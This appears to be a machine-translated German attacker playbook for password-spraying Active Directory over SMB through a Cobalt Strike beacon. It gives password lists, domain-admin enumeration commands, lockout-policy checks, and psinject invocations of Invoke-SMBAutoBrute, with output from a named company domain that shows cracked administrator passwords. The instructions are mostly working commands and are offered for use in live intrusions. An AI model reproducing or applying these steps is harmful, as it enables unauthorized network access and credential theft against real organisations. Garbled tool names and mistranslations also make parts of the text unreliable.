```SMB AUTOBRUT
Die Eingaben für diesen Angriff sind ausschließlich Passwörter.
   -   die von CharpChrome's Browser heruntergeladen wurden
   -   die, die SeatBeltom gesponnen hat
   -   diejenigen, die im Laufe der Arbeit innerhalb des Netzes ausgequetscht wurden (Mimicattsem, etc.)
Und im Allgemeinen alle anderen, wie zum Beispiel die in den Dateien
   
Wenn es weniger solcher Kennwörter gibt, als wir mit einem Brute-Force-Angriff angreifen können, können wir sie sicher aus der folgenden Liste der häufigsten Kennwörter in der Unternehmensumgebung hinzufügen.

Password1
Hello123
password
Welcome1
banco@1
training
Password123
job12345
spring
food1234


Wir empfehlen auch die Verwendung von Kennwortlisten, die sich an den Jahreszeiten und dem aktuellen Jahr orientieren. Angesichts der Tatsache, dass sich Passwörter alle drei Monate ändern, ist es möglich, eine "Reserve" zu nehmen, um eine solche Liste zu erstellen.
Zum Beispiel erstellen wir im August 2020 eine Liste mit folgendem Inhalt

June2020
July2020
August20
August2020
Summer20
Summer2020
June2020!
July2020!
August20!
August2020!
Summer20!
Summer2020!

Alle oben genannten Kennwörter erfüllen entweder 3 der 4 Active Directory-Kennwortanforderungen (was für die Benutzer ausreicht, um sie festzulegen) oder alle 4 Anforderungen.
Hinweis: Dies ist die am häufigsten verwendete Version der Anforderungen.


   
   Szenario mit Domänenadministratoren
1.   Sammeln Sie eine Liste der Domänenadministratoren mit dem Befehl shell net group "domain admins" /dom
   Schreiben der Daten in eine Datei
   admins.txt
   
2.   Laden Sie diese Datei auf den Host in den Ordner C:\ProgramData hoch.

3.   Informationen über die Domänenpolitik zur Sperrung von Konten anfordern (Schutz vor Bruteforcing)
   
   beacon> shell net accounts /dom
   

    Tasked beacon to run: net accounts /dom
    host called home, sent: 48 bytes
    received output:


   The request will be processed at a domain controller for domain shookconstruction.com.
   Force user logoff how long after time expires?:       Never
   Minimum password age (days):                          1
   Maximum password age (days):                          42
   Minimum password length:                              6
   Length of password history maintained:                24
   Lockout threshold:                                    Never
   Lockout duration (minutes):                           30
   Lockout observation window (minutes):                 30
   Computer role:                                        BACKUP

   Wir interessieren uns für den Parameter Sperrschwelle, der meist einen bestimmten numerischen Wert enthält, den wir später als Parameter verwenden sollen (in diesem Fall ist es Never, was bedeutet, dass der Passwortschutz deaktiviert ist.
   In diesem Leitfaden wird ein Wert von 5 als Näherungswert für den am häufigsten vorkommenden Wert in der Zukunft angegeben.
   Der Parameter Mindestlänge des Kennworts gibt die Mindestanzahl der für das Kennwort zulässigen Zeichen an und ist erforderlich, um unsere Kennwortliste zu filtern, die wir angeben werden.
   
4. Geben Sie im Quellcode des Skripts die Domäne an, in der das Skript ausgeführt werden soll
   -   Zeile             $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain","shookconstruction.com")

5.   Importieren und Ausführen des Skripts
   powershell-import /tmp/Fast-Guide/Invoke-SMBAutoBrute.ps1
   psinject 4728 x86 Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
   -   4728 ist in diesem Fall die aktuelle Pid und x86 ist ihre Bitgröße
   -   Die Liste der Passwörter besteht aus einem, das wir "gefunden" haben, und zwei aus einer Liste mit beliebten Passwörtern
   
6.   Beobachten Sie die Ausführung des Skripts und sehen Sie das Ergebnis
   

    Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+


   
   Wir haben zwei Domänenverwalter verschlüsselt.
   
========================================================================
   
   Ein Szenario ohne Benutzerliste unterscheidet sich nur in zwei Punkten.
   -   psinject 4728 x86 Invoke-SMBAutoBrute -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5
      Die Parameter UserList und ShowVerbose werden nicht angegeben. Das Fehlen des ersten Wortes bedeutet, dass ALLE Benutzer in der Domäne durchsucht werden, das Fehlen des zweiten Wortes bedeutet, dass nur die erfolgreichen Ergebnisse angezeigt werden.
   
   Ich werde in der Videoanleitung nicht auf das Skript warten, das alle Benutzer/Kennwort-Paare in der Domäne durchsucht, ich werde nur die Ausgabe zeigen.
   
   

    Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
    Success! Username: support. Password: 1qazXDR%+
    Success! Username: accountingdept. Password: 1qazXDR%+   


   
   Wie Sie sehen, konnten wir Konten von anderen Nutzern finden, die für die weitere Vernetzung und die Stärkung der Rechte nützlich sein könnten.

   Wenn es kein positives Ergebnis gibt, kann es nach einiger Zeit (am besten multiplizieren Sie den Parameter Lockout duration mit zwei vor dem nächsten Versuch) mit einer neuen Liste von Passwörtern wiederholt werden.
   Das Ende des Skripts wird durch eine Meldung im Beacon angezeigt